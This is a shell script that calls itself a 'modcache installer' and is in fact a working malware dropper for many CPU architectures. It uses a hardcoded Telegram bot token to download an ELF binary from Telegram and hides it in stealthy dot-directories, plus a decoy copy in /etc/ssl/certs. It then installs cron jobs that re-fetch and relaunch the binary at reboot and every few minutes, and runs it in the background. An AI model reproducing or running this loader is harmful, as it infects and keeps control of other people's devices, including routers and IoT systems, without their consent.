#!/bin/sh
# ============================================================
#  modcache installer — universal linux
#  arch autodetect (uname + /proc fallbacks) | tg fetch | self-plant
# ============================================================
TOK="8850962001:AAGZazMZdUQkJOgJEP9YX1afUccTTnMmO5A"
FID_AMD64="BQACAgUAAyEGAAMBCLg-WgADEmqj0r5sGmJUxO9Eq9xwJyKfaihaAAL5JAAC7l8gVRLjzFD3bUzJPQQ"
FID_ARM5="BQACAgUAAyEGAAMBCLg-WgADE2qj0sXuXBh74oS_PvY8X4bzYyexAAL6JAAC7l8gVdYLw5nTL39EPQQ"
FID_ARM7="BQACAgUAAyEGAAMBCLg-WgADD2qj0Yk6k-Ytsw6NW05hz22oJ3DCAALxJAAC7l8gVfeuCi29zwe6PQQ"
FID_MIPS="BQACAgUAAyEGAAMBCLg-WgADEGqj0Y99OmVAarYVNduhYQX7P5SwAALyJAAC7l8gVdKiim_rA865PQQ"
FID_MIPSLE="BQACAgUAAyEGAAMBCLg-WgADEWqj0hlg6xI2f2S0H3MAAb3y5mi6dQAC9iQAAu5fIFX09XmUPjjgtz0E"

# ---------- 1) ARCH DETECTION (uname first, /proc fallbacks) ----------
ARCH=""
M=""
U_M="$(uname -m 2>/dev/null)"
case "$U_M" in
  x86_64|amd64)         ARCH=amd64 ;;
  i386|i486|i586|i686)  ARCH=x86 ;;
  aarch64|arm64)        ARCH=arm64 ;;
  armv5*|armv5te*|armv4*) ARCH=arm5 ;;
  armv6*|armv7*|armv8*) ARCH=arm7 ;;
  mips)                 ARCH=mips ;;
  mipsle)               ARCH=mipsle ;;
  mips64)               ARCH=mips64 ;;
  mips64el|mips64le)    ARCH=mips64le ;;
  ppc|powerpc)          ARCH=ppc ;;
  ppc64)                ARCH=ppc64 ;;
  ppc64le)              ARCH=ppc64le ;;
  s390x)                ARCH=s390x ;;
  riscv64)              ARCH=riscv64 ;;
esac
# fallback 1: /proc/cpuinfo
if [ -z "$ARCH" ] && [ -r /proc/cpuinfo ]; then
  if grep -q "ARMv5\|ARMv4" /proc/cpuinfo 2>/dev/null; then ARCH=arm5
  elif grep -q "ARMv6\|ARMv7" /proc/cpuinfo 2>/dev/null; then ARCH=arm7
  elif grep -q "aarch64\|AArch64" /proc/cpuinfo 2>/dev/null; then ARCH=arm64
  elif grep -q "x86-64\|x86_64\|amd64" /proc/cpuinfo 2>/dev/null; then ARCH=amd64
  elif grep -qi "mips" /proc/cpuinfo 2>/dev/null; then
    # endianness via byteorder file
    if [ -r /proc/sys/abi/byteorder ] && grep -qi little /proc/sys/abi/byteorder 2>/dev/null; then
      ARCH=mipsle
    else
      ARCH=mips
    fi
  fi
fi
# fallback 2: endianness probe for mips vs mipsle ambiguity
if [ "$ARCH" = "mips" ]; then
  # little-endian mips shells often fail this hex test differently; use od probe
  LITTLE="$(printf '\x01\x00\x00\x00' | od -An -tx1 | tr -d ' \n')"
  [ "$LITTLE" = "01000000" ] && ARCH=mipsle
fi
# fallback 3: static ELF of /proc/self/exe? skip — uname+/cpuinfo covers real
if [ -z "$ARCH" ]; then
  echo "[x] unsupported arch: '$U_M'" >&2
  exit 1
fi
echo "[*] arch: $ARCH ($U_M)"

# map arch -> file_id (extendable)
case "$ARCH" in
  amd64)  FID="$FID_AMD64" ;;
  arm5)   FID="$FID_ARM5" ;;
  arm7)   FID="$FID_ARM7" ;;
  mips)   FID="$FID_MIPS" ;;
  mipsle) FID="$FID_MIPSLE" ;;
  *) echo "[x] no binary mapped for arch: $ARCH (supported: amd64 arm5 arm7 mips mipsle)" >&2; exit 1 ;;
esac

# ---------- 2) FETCH TOOL (curl or wget) ----------
fetch() { # $1=url $2=outfile
  if command -v curl >/dev/null 2>&1; then
    curl -4 -sL --max-time 180 "$1" -o "$2"
  elif command -v wget >/dev/null 2>&1; then
    wget -q -T 180 -O "$2" "$1"
  elif [ -x /usr/bin/curl ]; then /usr/bin/curl -4 -sL --max-time 180 "$1" -o "$2"
  elif [ -x /bin/busybox ] && /bin/busybox wget --help >/dev/null 2>&1; then
    /bin/busybox wget -q -O "$2" "$1"
  else
    return 127
  fi
}
json_val() { # crude "file_path" extractor (no jq dependency)
  grep -o '"file_path":"[^"]*"' | cut -d'"' -f4
}

# ---------- 3) WRITABLE+EXEC DIR SEARCH ----------
# candidates ordered by stealth; test with real exec probe
try_dirs="/var/lib/.sysmod /etc/ssl/certs /usr/local/lib/.cache /var/tmp/.cache /tmp/.cache $HOME/.local/.cache /dev/shm/.cache /tmp"
INSTALL_DIR=""
for d in $try_dirs; do
  [ -d "$d" ] || mkdir -p "$d" 2>/dev/null
  [ -d "$d" ] || continue
  # writable?
  touch "$d/.wtest" 2>/dev/null || continue
  rm -f "$d/.wtest" 2>/dev/null
  # exec-able? mount noexec check: copy /bin/sh (or busybox) and run -c true
  if [ -x /bin/sh ]; then
    cp /bin/sh "$d/.xtest" 2>/dev/null || continue
    chmod +x "$d/.xtest" 2>/dev/null
    if "$d/.xtest" -c "exit 0" >/dev/null 2>&1; then
      rm -f "$d/.xtest"
      INSTALL_DIR="$d"
      break
    fi
    rm -f "$d/.xtest" 2>/dev/null
  else
    INSTALL_DIR="$d"
    break
  fi
done
if [ -z "$INSTALL_DIR" ]; then
  echo "[x] no writable+exec directory found" >&2
  exit 1
fi
echo "[*] install dir: $INSTALL_DIR"

# ---------- 4) FETCH BINARY FROM TELEGRAM ----------
BIN="$INSTALL_DIR/.netmgmt"
mkdir -p "$INSTALL_DIR" 2>/dev/null
fetch "https://api.telegram.org/bot$TOK/getFile?file_id=$FID" "$INSTALL_DIR/.gj" || { echo "[x] getFile failed" >&2; exit 1; }
FP="$(json_val < "$INSTALL_DIR/.gj")"
rm -f "$INSTALL_DIR/.gj"
[ -n "$FP" ] || { echo "[x] no file_path in response" >&2; exit 1; }
echo "[*] fetching binary ($ARCH)..."
fetch "https://api.telegram.org/file/bot$TOK/$FP" "$BIN" || { echo "[x] download failed" >&2; exit 1; }
chmod 700 "$BIN"
# sanity: ELF magic
MAGIC="$(head -c 4 "$BIN" 2>/dev/null | od -An -tx1 | tr -d ' \n')"
[ "$MAGIC" = "7f454c46" ] || { echo "[x] downloaded file is not ELF" >&2; rm -f "$BIN"; exit 1; }
echo "[+] binary ok ($(wc -c < "$BIN") bytes)"

# ---------- 5) SECOND COPY (decoy) + PERSISTENCE ----------
if [ "$ARCH" = amd64 ] || [ "$ARCH" = arm7 ] || [ "$ARCH" = mips ] || [ "$ARCH" = mipsle ]; then
  DECOY="/etc/ssl/certs/.pki-agent"
else
  DECOY="$HOME/.local/.cache/.netmgmt"
fi
mkdir -p "$(dirname "$DECOY")" 2>/dev/null
cp "$BIN" "$DECOY" 2>/dev/null && chmod 700 "$DECOY" 2>/dev/null
# cron seeder: if binary missing -> pull from TG again, then run
PULL='P=$(curl -4 -s "https://api.telegram.org/bot'"$TOK"'/getFile?file_id='"$FID"'" | grep -o "\"file_path\":\"[^\"]*\"" | cut -d"\"" -f4); curl -4 -s "https://api.telegram.org/file/bot'"$TOK"'/$P" -o '"$BIN"' && chmod 700 '"$BIN"
if command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null | grep -v "\.netmgmt\|pki-agent" ; \
   echo "@reboot [ -x $BIN ] || { $PULL; }; $BIN" ; \
   echo "*/5 * * * * [ -x $BIN ] || { $PULL; }; $BIN" ; \
   echo "@reboot [ -x $DECOY ] || cp $BIN $DECOY" ; \
   echo "*/4 * * * * [ -x $DECOY ] || cp $BIN $DECOY") | crontab - 2>/dev/null
  echo "[+] cron hooks installed"
fi

# ---------- 6) RUN ----------
[ -x "$BIN" ] || { echo "[x] binary missing before exec" >&2; exit 1; }
if [ "$(id -u)" = "0" ] && command -v setsid >/dev/null 2>&1; then
  setsid nohup "$BIN" >/dev/null 2>&1 &
else
  nohup "$BIN" >/dev/null 2>&1 &
fi
echo "[+] launched from $INSTALL_DIR ($ARCH)"
